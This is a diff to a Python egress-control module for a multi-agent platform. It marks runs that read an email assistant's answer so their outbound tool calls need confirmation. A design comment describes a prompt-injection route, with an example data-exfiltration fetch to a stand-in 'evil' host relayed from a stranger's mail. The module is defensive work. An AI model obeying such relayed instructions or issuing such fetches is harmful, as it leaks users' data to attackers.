@@ -35,7 +35,9 @@ from __future__ import annotations
 
 import contextlib
 import sys
+import threading
 import weakref
+from collections import OrderedDict
 from collections.abc import Iterable, Mapping
 from typing import Any
 
@@ -52,13 +54,16 @@ __all__ = [
     "MCP_LOADER_KEY",
     "NO_EGRESS_KEY",
     "STORE_WRITES",
+    "UNTRUSTED_INPUT_AGENTS",
     "EgressGuardProvider",
     "RefuseEgressTools",
     "WithholdEgressTools",
     "egress_tool_names",
     "has_explicit_open_world",
     "is_egress_tool",
+    "mark_untrusted_answer",
     "no_egress_for_this_run",
+    "read_untrusted_answer",
     "tool_name",
 ]
 
@@ -87,6 +92,73 @@ DELEGATION_TOOLS: frozenset[str] = frozenset({
 STORE_WRITES: frozenset[str] = frozenset({
     "save_memory", "save_episode", "save_agent_memory", "save_org_memory", "save_note",
 })
+
+# ── An answer from an agent that reads stranger text (WS-17 EM-G11d) ────────
+#
+# ``email_app_master_plan.md`` §12.3.13.8. The email assistant reads mail that
+# a stranger wrote. H-236 holds what it reaches DOWN (each run it delegates to
+# binds ``no_egress``). Round 2 holds what it sends UP: its answer to
+# ``call_agent`` can relay "fetch https://evil/?d=..." from a mail, and the
+# calling run (Projects) keeps ``fetch_page``.
+#
+# So ``agent_tools`` frames that answer, and it marks the CALLING run in a
+# store of run ids (:func:`mark_untrusted_answer`). A ContextVar set inside a
+# tool does not reach the agent loop, so the store is module state, read by
+# run id. From then on, ``permission_policy.decide`` gives each egress call of
+# that run the code ``untrusted_answer_confirm``: the member's card first, and
+# a refusal when no card can show. A run that the marked run delegates to binds
+# ``no_egress`` (``_tool_injection._delegated_no_egress``). Fences:
+# ``tests/unit/test_delegation_no_egress.py`` and ``test_untrusted_frame.py``.
+
+#: Agents whose context holds text that a stranger wrote. The orchestrator
+#: reads the same set (``_tool_injection``), so one list names them.
+UNTRUSTED_INPUT_AGENTS: frozenset[str] = frozenset({"email-assistant"})
+
+#: The run ids that read an answer of an agent of
+#: :data:`UNTRUSTED_INPUT_AGENTS`, oldest first. Bounded: the oldest id goes
+#: first, long after its run ended.
+_UNTRUSTED_ANSWER_RUNS: OrderedDict[str, None] = OrderedDict()
+_UNTRUSTED_ANSWER_LIMIT = 4096
+_UNTRUSTED_ANSWER_LOCK = threading.Lock()
+
+
+def _run_key(ctx: Mapping[str, Any] | None = None) -> str:
+    """The run id of *ctx*, else of the run on this frame, else ``""``."""
+    if ctx is None:
+        try:
+            from acb_skills.write_artifact import artifact_context
+
+            ctx = artifact_context()
+        except Exception:
+            return ""
+    return str((ctx or {}).get("run_id") or "")
+
+
+def mark_untrusted_answer() -> bool:
+    """Record that the run on this frame read an untrusted agent's answer.
+
+    Returns False when the frame names no run, so nothing could be recorded.
+    """
+    key = _run_key()
+    if not key:
+        _log.warning("egress.untrusted_answer_unmarked")
+        return False
+    with _UNTRUSTED_ANSWER_LOCK:
+        _UNTRUSTED_ANSWER_RUNS[key] = None
+        _UNTRUSTED_ANSWER_RUNS.move_to_end(key)
+        while len(_UNTRUSTED_ANSWER_RUNS) > _UNTRUSTED_ANSWER_LIMIT:
+            _UNTRUSTED_ANSWER_RUNS.popitem(last=False)
+    _log.info("egress.untrusted_answer_marked")
+    return True
+
+
+def read_untrusted_answer(ctx: Mapping[str, Any] | None = None) -> bool:
+    """True when the run of *ctx* (else of this frame) read such an answer."""
+    key = _run_key(ctx)
+    if not key:
+        return False
+    with _UNTRUSTED_ANSWER_LOCK:
+        return key in _UNTRUSTED_ANSWER_RUNS
 
 #: The answer to a call that the control refuses. It names what is true of
 #: this run and claims nothing about the whole platform.
